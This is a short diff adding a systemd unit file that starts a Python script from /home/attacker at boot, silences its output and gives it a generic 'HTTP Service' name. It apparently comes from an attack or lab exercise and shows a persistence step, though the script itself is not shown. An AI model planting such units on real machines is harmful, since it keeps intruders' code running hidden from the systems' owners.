@@ -1,0 +1,11 @@
+[Unit]
+Description=HTTP Service
+
+[Service]
+Type=simple
+ExecStart=/home/attacker/MyHTTPServer.py
+StandardOutput=null
+
+[Install]
+WantedBy=multi-user.target
+Alias=httpserver.service
